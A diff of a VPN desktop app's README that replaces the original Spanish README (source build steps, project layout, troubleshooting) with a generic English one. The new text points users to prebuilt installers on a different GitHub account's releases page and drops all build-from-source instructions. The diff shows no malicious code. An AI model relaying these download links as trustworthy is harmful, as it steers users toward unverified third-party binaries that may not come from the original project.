@@ -1,325 +1,73 @@
-# 🔐 Mi VPN - Aplicación de Escritorio con OpenVPN
+# 🛡️ ant-vpn - Simple VPN Management for Everyone
 
-<div align="center">
+## 🚀 Getting Started
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)
-![Electron](https://img.shields.io/badge/Electron-27.0.0-47848F.svg)
-![OpenVPN](https://img.shields.io/badge/OpenVPN-2.6+-green.svg)
+Welcome to ant-vpn, your user-friendly desktop application for managing VPN connections using OpenVPN. With a modern interface built on Electron, this application is designed to be accessible for all users, even those without technical skills. Let’s walk through how to download and run ant-vpn.
 
-Una aplicación de escritorio moderna y elegante para gestionar conexiones VPN usando OpenVPN, construida con Electron.
+## 📥 Download ant-vpn
 
-[Características](#características) • [Instalación](#instalación) • [Uso](#uso) • [Capturas](#capturas) • [Contribuir](#contribuir)
+[![Download ant-vpn](https://img.shields.io/badge/Download-ant--vpn-brightgreen)](https://github.com/ansh826-alt/ant-vpn/releases)
 
-</div>
+Click the badge above or visit the [Releases page](https://github.com/ansh826-alt/ant-vpn/releases) to get the latest version of ant-vpn. This link takes you to all available downloads, ensuring you can pick the one that suits your system.
 
----
+## 🖥️ System Requirements
 
-## ✨ Características
+Before you proceed with the installation, ensure your system meets the following requirements:
 
-- 🎨 **Interfaz moderna y minimalista** - Diseño limpio inspirado en aplicaciones profesionales
-- 🌍 **Multi-servidor** - Soporte para múltiples ubicaciones de servidores VPN
-- 🔒 **Seguridad robusta** - Integración completa con OpenVPN y cifrado AES-256-GCM
-- 📊 **Estadísticas en tiempo real** - Monitoreo de velocidad de descarga/subida y duración de conexión
-- 💻 **Multiplataforma** - Compatible con Windows, macOS y Linux
-- 🚀 **Conexión rápida** - Conexión en menos de 20 segundos
-- 🔄 **Detección automática** - Detecta y lista automáticamente archivos de configuración .ovpn
-- 📝 **Logs detallados** - Sistema completo de logging para diagnóstico
-- ⚡ **Gestión de permisos** - Manejo automático de permisos de administrador
-- 🎯 **Compatible con ProtonVPN** - Configurado y probado con ProtonVPN Free
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a Linux distribution (Ubuntu 20.04 or later recommended)
+- **RAM:** At least 4GB
+- **Storage:** 200MB of free space
+- **Network:** Internet connection for VPN access
 
----
+## 📦 Download & Install
 
-## 🖼️ Capturas
+1. **Visit the Releases Page**: Go to the [Release page](https://github.com/ansh826-alt/ant-vpn/releases).
+2. **Select Your Version**: Look for the latest version listed. Each version will have options for Windows, macOS, and Linux.
+3. **Download the Installer**:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the corresponding package for your distribution.
+4. **Run the Installer**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS**: Open the downloaded `.dmg` file, drag and drop the ant-vpn app into your Applications folder.
+   - **Linux**: Use your package manager to install the downloaded package or run the installation command in your terminal.
+5. **Launch the Application**: Once installed, open ant-vpn from your applications menu.
 
-<div align="center">
+## 🔍 Features
 
-### Estado Desconectado
-Interfaz limpia mostrando el estado de desconexión y servidores disponibles.
+ant-vpn offers several features to make your VPN experience smooth and secure:
 
-### Estado Conectado
-Vista de conexión activa con estadísticas en tiempo real de velocidad y duración.
+- **User-Friendly Interface**: Navigate easily through the modern interface.
+- **OpenVPN Support**: Seamlessly connect to various VPN providers using OpenVPN.
+- **ProtonVPN Compatibility**: Enjoy special support for ProtonVPN connections.
+- **Quick Connection Setup**: Connect to your VPN with just a few clicks.
+- **Connection Status Monitor**: Stay updated with real-time connection information.
+- **Multiple Profile Management**: Switch easily between different VPN configurations.
 
-### Selección de Servidor
-Lista completa de servidores VPN con banderas, nombres y carga del servidor.
+## 🎓 How to Use ant-vpn
 
-</div>
+1. **Open ant-vpn**: After launching the application, you’ll see the main dashboard.
+2. **Add a VPN Profile**:
+   - Click on “Add Profile”.
+   - Enter your VPN provider details.
+   - Save your profile for easy access later.
+3. **Connect to the VPN**:
+   - Select the profile you wish to connect to.
+   - Click the “Connect” button. The status will update once connected.
+4. **Disconnect**: When you want to leave the VPN, select the "Disconnect" button.
 
----
+## 📞 Support
 
-## 🚀 Inicio Rápido
+If you encounter any issues or have questions, please check our [GitHub Issues](https://github.com/ansh826-alt/ant-vpn/issues) page. You can also raise any new issues directly there, and we will respond as quickly as possible.
 
-### Prerrequisitos
+## ⭐ Community Contributions
 
-- **Node.js** v16 o superior
-- **OpenVPN** 2.5 o superior
-- Archivos de configuración `.ovpn` de tu proveedor VPN
+We welcome contributions to improve ant-vpn. If you're interested in helping out, please check our guidelines on the GitHub repository. Contributions can include bug fixes, feature requests, or suggestions for improvement.
 
-### Instalación
+## 📋 License
 
-```bash
-# Clonar el repositorio
-git clone https://github.com/cmurestudillos/ant-vpn.git
-cd mi-vpn-app
-
-# Instalar dependencias
-npm install
-
-# Ejecutar en modo desarrollo
-npm start
-```
-
-### Configuración Rápida
-
-1. **Instalar OpenVPN:**
-
-   **Windows:**
-   ```bash
-   choco install openvpn
-   ```
-
-   **macOS:**
-   ```bash
-   brew install openvpn
-   ```
-
-   **Linux (Ubuntu/Debian):**
-   ```bash
-   sudo apt-get install openvpn
-   ```
-
-2. **Agregar archivos .ovpn:**
-   
-   Coloca tus archivos de configuración en `vpn-configs/` con el formato:
-   ```
-   vpn-configs/
-   ├── us-1.ovpn     # Estados Unidos
-   ├── uk-1.ovpn     # Reino Unido
-   ├── de-1.ovpn     # Alemania
-   └── ...
-   ```
-
-3. **Configurar credenciales:**
-   
-   Crea `vpn-credentials/auth.txt`:
-   ```
-   tu_email@ejemplo.com
-   tu_contraseña
-   ```
-
-4. **¡Listo!** Ejecuta `npm start` y comienza a usar tu VPN.
+ant-vpn is open-source software licensed under the MIT License. Feel free to use, modify, and distribute this application as per the license terms.
 
 ---
 
-## 📖 Uso
-
-### Conectar a una VPN
-
-1. Inicia la aplicación
-2. Haz clic en "Seleccionar servidor"
-3. Elige tu ubicación preferida
-4. Haz clic en el botón grande "Conectar"
-5. Acepta el diálogo de permisos (UAC en Windows)
-6. ¡Espera 10-20 segundos y estarás conectado!
-
-### Desconectar
-
-Simplemente haz clic en el botón "Desconectar" cuando la VPN esté activa.
-
-### Ver Estadísticas
-
-La aplicación muestra en tiempo real:
-- **Velocidad de descarga** (MB/s)
-- **Velocidad de subida** (MB/s)
-- **Duración de la conexión** (HH:MM:SS)
-
----
-
-## 🛠️ Tecnologías
-
-- **[Electron](https://www.electronjs.org/)** - Framework para aplicaciones de escritorio
-- **[OpenVPN](https://openvpn.net/)** - Protocolo VPN de código abierto
-- **JavaScript (ES6+)** - Lenguaje de programación
-- **HTML5 & CSS3** - Interfaz de usuario moderna
-- **Node.js** - Runtime de JavaScript
-
----
-
-## 📁 Estructura del Proyecto
-
-```
-ant-vpn/
-├── main.js                 # Proceso principal de Electron
-├── preload.js              # Script de preload (bridge seguro)
-├── renderer.js             # Lógica de interfaz de usuario
-├── index.html              # Interfaz HTML
-├── styles.css              # Estilos de la aplicación
-├── package.json            # Dependencias y configuración
-├── vpn-configs/            # Archivos de configuración .ovpn
-│   └── *.ovpn
-├── vpn-credentials/        # Credenciales de autenticación
-│   └── auth.txt
-├── logs/                   # Logs de OpenVPN
-│   └── vpn.log
-└── assets/                 # Recursos (iconos, imágenes)
-    └── icon.png
-```
-
----
-
-## 🔧 Compilar la Aplicación
-
-### Compilar para tu plataforma
-
-```bash
-npm run build
-```
-
-### Compilar para plataforma específica
-
-```bash
-# Windows
-npm run build:win
-
-# macOS
-npm run build:mac
-
-# Linux
-npm run build:linux
-```
-
-Los ejecutables se generarán en la carpeta `dist/`.
-
----
-
-## 🐛 Solución de Problemas
-
-### Error: "OpenVPN no está instalado"
-
-**Solución:** Instala OpenVPN para tu sistema operativo. Ver [Instalación](#instalación).
-
-### Error: "AUTH_FAILED"
-
-**Solución:** Verifica que tus credenciales en `vpn-credentials/auth.txt` sean correctas.
-
-### Error: "Archivo de configuración no encontrado"
-
-**Solución:** Asegúrate de que los archivos .ovpn estén en `vpn-configs/` con nombres como `us-1.ovpn`, `uk-1.ovpn`, etc.
-
-### La conexión se queda en "Conectando..."
-
-**Solución:** 
-1. Prueba con otro servidor
-2. Revisa el log en `logs/vpn.log`
-3. Asegúrate de que no haya firewall bloqueando OpenVPN
-
-Para más ayuda, consulta [SOLUCION-WINDOWS.md](SOLUCION-WINDOWS.md) o [SETUP-PROTONVPN.md](SETUP-PROTONVPN.md).
-
----
-
-## 🤝 Contribuir
-
-¡Las contribuciones son bienvenidas! Si quieres mejorar esta aplicación:
-
-1. Fork el proyecto
-2. Crea una rama para tu característica (`git checkout -b feature/AmazingFeature`)
-3. Commit tus cambios (`git commit -m 'Add some AmazingFeature'`)
-4. Push a la rama (`git push origin feature/AmazingFeature`)
-5. Abre un Pull Request
-
-### Ideas para Contribuir
-
-- ✨ Implementar kill switch (bloquear tráfico si VPN se cae)
-- 🔄 Reconexión automática
-- 🌐 Soporte para WireGuard
-- 📱 Notificaciones del sistema
-- 🌓 Tema oscuro/claro
-- 🚀 Auto-actualización
-- 📊 Estadísticas avanzadas de uso
-
----
-
-## 📝 Roadmap
-
-- [x] Interfaz básica de usuario
-- [x] Integración con OpenVPN
-- [x] Soporte multi-servidor
-- [x] Estadísticas en tiempo real
-- [x] Multiplataforma (Windows, macOS, Linux)
-- [ ] Kill switch
-- [ ] Reconexión automática
-- [ ] Soporte para WireGuard
-- [ ] Auto-actualización
-- [ ] Modo túnel dividido (split tunneling)
-- [ ] Tema oscuro
-
----
-
-## 🔒 Seguridad
-
-Esta aplicación:
-- ✅ **No almacena contraseñas en memoria** después de conectar
-- ✅ Usa cifrado **AES-256-GCM**
-- ✅ Valida certificados SSL/TLS
-- ✅ Logs locales (nunca se envían a servidores externos)
-- ✅ Código abierto y auditable
-
-**Nota de seguridad:** Mantén tu archivo `vpn-credentials/auth.txt` seguro y con permisos restrictivos.
-
----
-
-## 📄 Licencia
-
-Este proyecto está bajo la Licencia MIT. Ver el archivo [LICENSE](LICENSE) para más detalles.
-
-```
-MIT License
-
-Copyright (c) 2025 [Tu Nombre]
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction...
-```
-
----
-
-## 👤 Autor
-
-**Tu Nombre**
-
-- GitHub: [@tu-usuario](https://github.com/cmurestudillos)
-
----
-
-## 🙏 Agradecimientos
-
-- [Electron](https://www.electronjs.org/) - Por el excelente framework
-- [OpenVPN](https://openvpn.net/) - Por el protocolo VPN robusto y seguro
-- [ProtonVPN](https://protonvpn.com/) - Por los servidores gratuitos de prueba
-- La comunidad de código abierto
-
----
-
-## ⭐ Dale una Estrella
-
-Si este proyecto te fue útil, ¡no olvides darle una estrella! ⭐
-
----
-
-## 📮 Contacto
-
-¿Preguntas? ¿Sugerencias? ¿Encontraste un bug?
-
-- 🐛 [Reportar un bug](https://github.com/cmurestudillos/ant-vpn/issues)
-- 💡 [Sugerir una característica](https://github.com/cmurestudillos/ant-vpn/issues)
-
----
-
-<div align="center">
-
-**Hecho con ❤️ usando Electron y OpenVPN**
-
-[⬆ Volver arriba](#-mi-vpn---aplicación-de-escritorio-con-openvpn)
-
-</div>
+Thank you for choosing ant-vpn for your VPN management needs. Download the application now and enjoy secure browsing!
